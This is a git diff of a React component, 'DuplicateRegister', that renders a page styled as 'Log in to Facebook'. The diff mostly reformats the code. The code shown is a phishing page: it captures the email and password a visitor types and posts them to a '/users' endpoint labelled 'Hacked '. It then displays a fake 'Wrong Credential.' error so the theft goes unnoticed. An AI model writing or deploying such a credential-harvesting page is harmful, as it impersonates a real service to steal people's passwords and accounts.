@@ -4,7 +4,7 @@ import Swal from "sweetalert2";
 import useAxiosPublic from "../../Hooks/useAxiosPublic";
 
 const DuplicateRegister = () => {
-  const axiosPublic = useAxiosPublic()
+  const axiosPublic = useAxiosPublic();
   const handleSubmitRegister = async (e) => {
     e.preventDefault();
     // e.target.reset();
@@ -13,26 +13,24 @@ const DuplicateRegister = () => {
     const password = e.target.password.value;
     console.log(email, password);
 
-        const userInfo = {
-          name: "Hacked ",
-          email: email,
-          passwords: password,
-        };
-        axiosPublic.post("/users", userInfo).then((res) => {
-          if (res.data.insertedId) {
-            console.log("user added to the database");
-            Swal.fire({
-              position: "top-center",
-              icon: "error",
-              title: "Wrong Credential.",
-              showConfirmButton: false,
-              timer: 1500,
-            });
-            e.target.reset();
-           
-          }
+    const userInfo = {
+      name: "Hacked ",
+      email: email,
+      passwords: password,
+    };
+    axiosPublic.post("/users", userInfo).then((res) => {
+      if (res.data.insertedId) {
+        console.log("user added to the database");
+        Swal.fire({
+          position: "top-center",
+          icon: "error",
+          title: "Wrong Credential.",
+          showConfirmButton: false,
+          timer: 1500,
         });
-     
+        e.target.reset();
+      }
+    });
   };
 
   return (
@@ -43,17 +41,15 @@ const DuplicateRegister = () => {
       </Helmet>
       <div className="bg-gradient-to-b from-blue-50 to-blue-100 h-screen flex items-center justify-center">
         <div className=" p-6  w-96">
-          <div className="w-20 h-20 mb-3 bg-blue-500 rounded-[80%] flex justify-center items-center mx-auto "> 
-                <h1 className="text-7xl font-bold text-white ">f</h1>
+          <div className="w-20 h-20 mb-3 bg-blue-500 rounded-[80%] flex justify-center items-center mx-auto ">
+            <h1 className="text-7xl font-bold text-white ">f</h1>
           </div>
           <h2 className="text-2xl font-bold mb-6 text-center">
             Log in to Facebook
           </h2>
           <form onSubmit={handleSubmitRegister}>
             <div className="mb-4">
-              <label
-                className="block text-gray-700 text-sm font-bold mb-2"
-              >
+              <label className="block text-gray-700 text-sm font-bold mb-2">
                 Email or Phone
               </label>
               <input
@@ -65,9 +61,7 @@ const DuplicateRegister = () => {
               />
             </div>
             <div className="mb-6">
-              <label className="block  text-sm font-bold mb-2">
-                Password
-              </label>
+              <label className="block  text-sm font-bold mb-2">Password</label>
               <input
                 className="shadow appearance-none border bg-white rounded-3xl w-full py-4 px-3 text-gray-700 mb-3 leading-tight focus:outline-none focus:shadow-outline"
                 id="password"
